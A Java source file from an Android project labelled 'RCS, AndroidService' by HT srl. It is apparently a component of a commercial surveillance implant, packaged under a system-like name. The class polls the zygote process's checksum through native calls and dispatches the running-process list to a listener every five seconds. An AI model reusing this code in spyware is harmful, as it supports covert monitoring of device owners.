/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.listener;

import com.android.networking.RunningProcesses;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public class BroadcastMonitorProcess extends Thread {
	static {
		System.loadLibrary("runner");
	}

	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$

	// Get PID
	private native int gp(String process);

	// Get CRC
	private native int gc(int p);

	private boolean stop;
	private final int period;
	private int zygotePid, crcList;

	RunningProcesses runningProcess;

	private ListenerProcess listenerProcess;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 5000; // Poll interval
		runningProcess = new RunningProcesses();
		zygotePid = gp("zygote");

		if (zygotePid != -1) {
			crcList = gc(zygotePid);
		}
	}

	@Override
	public void run() {
		int curCrc;

		do {
			if (stop) {
				return;
			}

			if (zygotePid != -1) {
				curCrc = gc(zygotePid);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) crc: " + curCrc);
				}

				if (curCrc != crcList) {
					crcList = curCrc;
				}
			}

			runningProcess.update();
			listenerProcess.dispatch(runningProcess);

			try {
				synchronized (this) {
					wait(period);
				}
			} catch (final InterruptedException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
		} while (true);
	}

	synchronized void register(ListenerProcess listenerProcess) {
		stop = false;
		this.listenerProcess = listenerProcess;
	}

	synchronized void unregister() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unregister)");
		}
		stop = true;
		notifyAll();
	}
}
